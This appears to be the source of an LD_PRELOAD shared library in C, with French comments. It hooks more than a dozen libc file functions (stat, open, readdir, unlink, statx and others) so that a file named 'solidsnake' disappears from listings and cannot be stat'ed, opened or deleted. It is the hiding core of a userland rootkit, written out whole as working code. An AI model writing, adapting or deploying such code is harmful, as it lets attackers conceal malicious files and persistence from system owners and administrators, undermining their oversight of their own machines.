#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <stdarg.h>

// Fonction pour choisir le nom du fichier qui doit être masqué
int file_invisible(const char *path) {
    return strcmp(path, "solidsnake") == 0;
}

// Interception de la fonction stat
int stat(const char *path, struct stat *buf) {
    static int (*original_stat)(const char *, struct stat *) = NULL;
    if (!original_stat) {
        original_stat = dlsym(RTLD_NEXT, "stat");
    }

    if (file_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    return original_stat(path, buf);
}

// Interception de la fonction lstat
int lstat(const char *path, struct stat *buf) {
    static int (*original_lstat)(const char *, struct stat *) = NULL;
    if (!original_lstat) {
        original_lstat = dlsym(RTLD_NEXT, "lstat");
    }

    if (file_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    return original_lstat(path, buf);
}

// Interception de la fonction open
int open(const char *pathname, int flags, ...) {
    static int (*original_open)(const char *, int, ...) = NULL;
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    int result = original_open(pathname, flags, va_arg(args, mode_t));
    va_end(args);

    return result;
}

// Interception de la fonction access
int access(const char *path, int amode) {
    static int (*original_access)(const char *, int) = NULL;
    if (!original_access) {
        original_access = dlsym(RTLD_NEXT, "access");
    }

    if (file_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    return original_access(path, amode);
}

// Interception de la fonction fopen
FILE *fopen(const char *filename, const char *mode) {
    static FILE *(*original_fopen)(const char *, const char *) = NULL;
    if (!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (file_invisible(filename)) {
        errno = ENOENT;
        return NULL;
    }

    return original_fopen(filename, mode);
}

// Interception de la fonction fopen64
FILE *fopen64(const char *filename, const char *mode) {
    static FILE *(*original_fopen64)(const char *, const char *) = NULL;
    if (!original_fopen64) {
        original_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    }

    if (file_invisible(filename)) {
        errno = ENOENT;
        return NULL;
    }

    return original_fopen64(filename, mode);
}

// Interception de la fonction readdir
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "solidsnake") == 0) {
            continue;
        }
        return entry;
    }

    return NULL;
}

// Interception de la fonction readdir64
struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
    if (!original_readdir64) {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *entry;
    while ((entry = original_readdir64(dirp)) != NULL) {
        if (strcmp(entry->d_name, "solidsnake") == 0) {
            continue;
        }
        return entry;
    }

    return NULL;
}

// Interception de la fonction unlink
int unlink(const char *pathname) {
    static int (*original_unlink)(const char *) = NULL;
    if (!original_unlink) {
        original_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_unlink(pathname);
}

// Interception de la fonction unlinkat
int unlinkat(int dirfd, const char *pathname, int flags) {
    static int (*original_unlinkat)(int, const char *, int) = NULL;
    if (!original_unlinkat) {
        original_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_unlinkat(dirfd, pathname, flags);
}

// Interception de la fonction rmdir
int rmdir(const char *pathname) {
    static int (*original_rmdir)(const char *) = NULL;
    if (!original_rmdir) {
        original_rmdir = dlsym(RTLD_NEXT, "rmdir");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_rmdir(pathname);
}

// Interception de la fonction openat
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*original_openat)(int, const char *, int, ...) = NULL;
    if (!original_openat) {
        original_openat = dlsym(RTLD_NEXT, "openat");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    int result = original_openat(dirfd, pathname, flags, va_arg(args, mode_t));
    va_end(args);

    return result;
}

// Interception de la fonction newfstatat
int newfstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    static int (*original_newfstatat)(int, const char *, struct stat *, int) = NULL;
    if (!original_newfstatat) {
        original_newfstatat = dlsym(RTLD_NEXT, "newfstatat");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_newfstatat(dirfd, pathname, statbuf, flags);
}

// Interception de la fonction statx
int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *statxbuf) {
    static int (*original_statx)(int, const char *, int, unsigned int, struct statx *) = NULL;
    if (!original_statx) {
        original_statx = dlsym(RTLD_NEXT, "statx");
    }

    if (file_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_statx(dirfd, pathname, flags, mask, statxbuf);
}